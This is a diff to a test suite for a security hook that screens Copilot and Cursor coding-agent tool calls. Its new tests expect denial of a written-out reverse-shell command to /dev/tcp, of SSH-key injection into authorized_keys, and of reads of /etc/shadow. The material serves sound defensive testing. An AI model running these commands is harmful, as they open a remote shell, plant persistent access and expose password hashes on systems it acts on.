@@ -4,6 +4,7 @@ import { execFile } from "node:child_process";
 import { mkdtempSync, readFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
+import { CANARY_MARKERS } from "@gendigital/sage-core/testing";
 import { describe, expect, it, vi } from "vitest";
 
 const DIST_DIR = resolve(__dirname, "..", "..", "dist");
@@ -295,7 +296,7 @@ describe("VS Code (Copilot) hook integration", () => {
 	it("VS Code: fetch_webpage denies canary URL", async () => {
 		const { stdout, code } = await runHook("vscode", {
 			tool_name: "fetch_webpage",
-			tool_input: { urls: ["https://sage-canary-deny-4e91ca37.test/page"], query: "content" },
+			tool_input: { urls: [`https://${CANARY_MARKERS.urlDeny}.test/page`], query: "content" },
 		});
 		const response = parseResponse(stdout);
 		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
@@ -355,6 +356,37 @@ describe("VS Code (Copilot) hook integration", () => {
 		});
 		expect(code).toBe(0);
 		expect(parseResponse(stdout)).toEqual({});
+	});
+
+	it("CLI: normalizes the committed Copilot PreToolUse envelope fixture", async () => {
+		// Anchors fixtures/contract/copilot-pre-tool-use.json as a valid, normalizable
+		// Copilot CLI wire payload. The live drift layer (see e2e/README.md)
+		// captures the real host payload and structurally diffs it against this fixture;
+		// this deterministic case guarantees the committed baseline still normalizes to a
+		// clean allow before any container ever runs.
+		const fixture = JSON.parse(
+			readFileSync(
+				resolve(__dirname, "fixtures", "contract", "copilot-pre-tool-use.json"),
+				"utf-8",
+			),
+		);
+		const { stdout, code } = await runHook("vscode", fixture);
+		expect(code).toBe(0);
+		expect(parseResponse(stdout)).toEqual({});
+	});
+
+	it("CLI: normalizes the committed Cursor preToolUse envelope fixture", async () => {
+		// Anchors fixtures/contract/cursor-pre-tool-use.json as a valid, normalizable
+		// Cursor `agent` CLI wire payload. The live drift layer (see e2e/README.md)
+		// captures the real host payload and structurally diffs it against this
+		// fixture; this deterministic case guarantees the committed baseline still
+		// normalizes to a clean allow before any container ever runs.
+		const fixture = JSON.parse(
+			readFileSync(resolve(__dirname, "fixtures", "contract", "cursor-pre-tool-use.json"), "utf-8"),
+		);
+		const { stdout, code } = await runHook("cursor", fixture);
+		expect(code).toBe(0);
+		expect(parseResponse(stdout).decision).toBe("allow");
 	});
 
 	it("CLI: bash denies suspicious command", async () => {
@@ -442,7 +474,7 @@ describe("VS Code (Copilot) hook integration", () => {
 	it("CLI: web_fetch denies canary URL", async () => {
 		const { stdout, code } = await runHook("vscode", {
 			tool_name: "web_fetch",
-			tool_input: { url: "https://sage-canary-deny-4e91ca37.test/page" },
+			tool_input: { url: `https://${CANARY_MARKERS.urlDeny}.test/page` },
 		});
 		const response = parseResponse(stdout);
 		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
@@ -464,6 +496,96 @@ describe("VS Code (Copilot) hook integration", () => {
 		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
 		expect(hookSpecificOutput.permissionDecision).toMatch(/^(deny|ask)$/);
 		expect(code).toBe(0);
+	});
+
+	// --- Copilot CLI 1.0.63: PascalCase tool names + renamed input fields ---
+	// Copilot CLI 1.0.63 renamed its hook tools to PascalCase (Bash/Write/Read/Edit/
+	// Grep/WebFetch) and changed input fields (Write: file_text, Edit: old_str/new_str,
+	// Grep: paths). Pin these so the connector vocabulary can't silently regress.
+
+	it("CLI 1.0.63: Bash denies suspicious command", async () => {
+		const { stdout, code } = await runHook("vscode", {
+			tool_name: "Bash",
+			tool_input: {
+				command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+				description: "reverse shell",
+			},
+		});
+		const response = parseResponse(stdout);
+		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
+		expect(hookSpecificOutput.permissionDecision).toMatch(/^(deny|ask)$/);
+		expect(code).toBe(0);
+	});
+
+	it("CLI 1.0.63: Write denies sensitive path via file_text", async () => {
+		const { stdout, code } = await runHook("vscode", {
+			tool_name: "Write",
+			tool_input: { path: "/home/user/.ssh/authorized_keys", file_text: "ssh-rsa AAAA injected" },
+		});
+		const response = parseResponse(stdout);
+		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
+		expect(hookSpecificOutput.permissionDecision).toMatch(/^(deny|ask)$/);
+		expect(code).toBe(0);
+	});
+
+	it("CLI 1.0.63: Edit denies sensitive path via old_str/new_str", async () => {
+		const { stdout, code } = await runHook("vscode", {
+			tool_name: "Edit",
+			tool_input: {
+				path: "/home/user/.ssh/authorized_keys",
+				old_str: "old",
+				new_str: "ssh-rsa AAAA injected",
+			},
+		});
+		const response = parseResponse(stdout);
+		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
+		expect(hookSpecificOutput.permissionDecision).toMatch(/^(deny|ask)$/);
+		expect(code).toBe(0);
+	});
+
+	it("CLI 1.0.63: Read denies sensitive path", async () => {
+		const { stdout, code } = await runHook("vscode", {
+			tool_name: "Read",
+			tool_input: { path: "/etc/shadow" },
+		});
+		const response = parseResponse(stdout);
+		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
+		expect(hookSpecificOutput.permissionDecision).toMatch(/^(deny|ask)$/);
+		expect(code).toBe(0);
+	});
+
+	it("CLI 1.0.63: WebFetch denies canary URL", async () => {
+		const { stdout, code } = await runHook("vscode", {
+			tool_name: "WebFetch",
+			tool_input: { url: `https://${CANARY_MARKERS.urlDeny}.test/page` },
+		});
+		const response = parseResponse(stdout);
+		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
+		expect(hookSpecificOutput.permissionDecision).toMatch(/^(deny|ask)$/);
+		expect(code).toBe(0);
+	});
+
+	it("CLI 1.0.63: Grep denies sensitive path via paths array", async () => {
+		// 1.0.63 Grep sends {pattern, paths:[...]} — a sensitive path must still be denied.
+		// Regression guard: readFilePath ignores `paths`, so without extractFromGrep the call
+		// produced zero artifacts and fell open to allow (no_artifacts short-circuit).
+		const { stdout, code } = await runHook("vscode", {
+			tool_name: "Grep",
+			tool_input: { pattern: "secret", paths: ["/etc/shadow"] },
+		});
+		const response = parseResponse(stdout);
+		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
+		expect(hookSpecificOutput.permissionDecision).toMatch(/^(deny|ask)$/);
+		expect(code).toBe(0);
+	});
+
+	it("CLI 1.0.63: Bash allows benign command (the committed envelope fixture)", async () => {
+		const { stdout, code } = await runHook("vscode", {
+			tool_name: "Bash",
+			tool_input: { command: "echo sage-copilot-contract", description: "Run echo command" },
+		});
+		expect(code).toBe(0);
+		expect(parseResponse(stdout)).toEqual({});
 	});
 
 	// --- Fail-open behavior ---
